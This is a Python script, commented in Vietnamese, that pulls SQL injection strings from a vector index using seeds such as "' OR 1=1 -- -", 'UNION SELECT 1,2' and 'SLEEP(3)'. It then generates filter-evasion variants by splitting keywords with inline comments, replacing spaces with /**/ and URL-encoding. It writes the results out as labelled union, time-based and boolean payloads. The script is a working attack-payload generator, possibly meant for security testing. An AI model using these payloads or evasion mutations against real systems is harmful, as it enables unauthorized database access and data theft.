#!/usr/bin/env python
import argparse, json, random, pathlib
import numpy as np
import joblib
from sklearn.metrics.pairwise import cosine_similarity
from scipy.sparse import issparse, csr_matrix

# cố gắng tái dụng mutations của repo
try:
    from rag.utils import simple_mutations
except Exception:
    # fallback tối thiểu
    import urllib.parse, re
    def simple_mutations(s: str):
        cand = set()
        s = str(s)
        cand.add(s)
        # vài biến thể nhỏ
        cand.add(s.replace(" ", "/**/"))
        cand.add(s.replace("UNION", "UN/**/ION"))
        cand.add(s.replace("SELECT", "SE/**/LECT"))
        cand.add(urllib.parse.quote(s, safe=""))
        cand.add(re.sub(r"\s+", " ", s))
        return list(cand)

def classify(s: str):
    ls = s.lower()
    if ("union" in ls) and ("select" in ls): return "union"
    if ("sleep(" in ls) or ("benchmark(" in ls): return "time"
    if (" or " in ls and "1=1" in ls) or (" and " in ls and "1=1" in ls) or ("1=1" in ls): return "boolean"
    return "sqli"

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--index", required=True)
    ap.add_argument("--n", type=int, default=25, help="số payload mong muốn")
    ap.add_argument("--top_k", type=int, default=50)
    ap.add_argument("--out", required=True)
    args = ap.parse_args()

    b = joblib.load(args.index)
    vec = b["vectorizer"]

    X = b.get("X", None)
    if X is None:
        X = b.get("mat", None)
    if X is None:
        raise RuntimeError("Bundle thiếu 'X' hoặc 'mat'.")

    # đảm bảo là CSR để cosine_similarity chơi đẹp
    if not issparse(X):
        X = csr_matrix(X)

    docs = b["docs"]

    # seed truy vấn để kéo đúng nhóm SQLi
    seeds = [
        "UNION SELECT 1,2",
        "' OR 1=1 -- -",
        "SLEEP(3)"
    ]
    # lấy top_k chuỗi từ kho
    idx_pool = set()
    for q in seeds:
        qv = vec.transform([q])
        sims = cosine_similarity(qv, X).ravel()
        top = np.argsort(-sims)[:args.top_k]
        idx_pool.update(top.tolist())

    bases = [docs[i] for i in idx_pool]
    random.shuffle(bases)

    # phát sinh payloads đến khi đủ n
    out = []
    for base in bases:
        if len(out) >= args.n: break
        base = str(base)
        for m in simple_mutations(base):
            m = str(m).strip()
            if not m: continue
            out.append({
                "payload": m,
                "meta": {"pattern": classify(m), "source": "fallback_mutation"}
            })
            if len(out) >= args.n:
                break

    pathlib.Path(args.out).parent.mkdir(parents=True, exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as f:
        for r in out[:args.n]:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    print("Wrote", len(out[:args.n]), "payloads to", args.out)

if __name__ == "__main__":
    main()
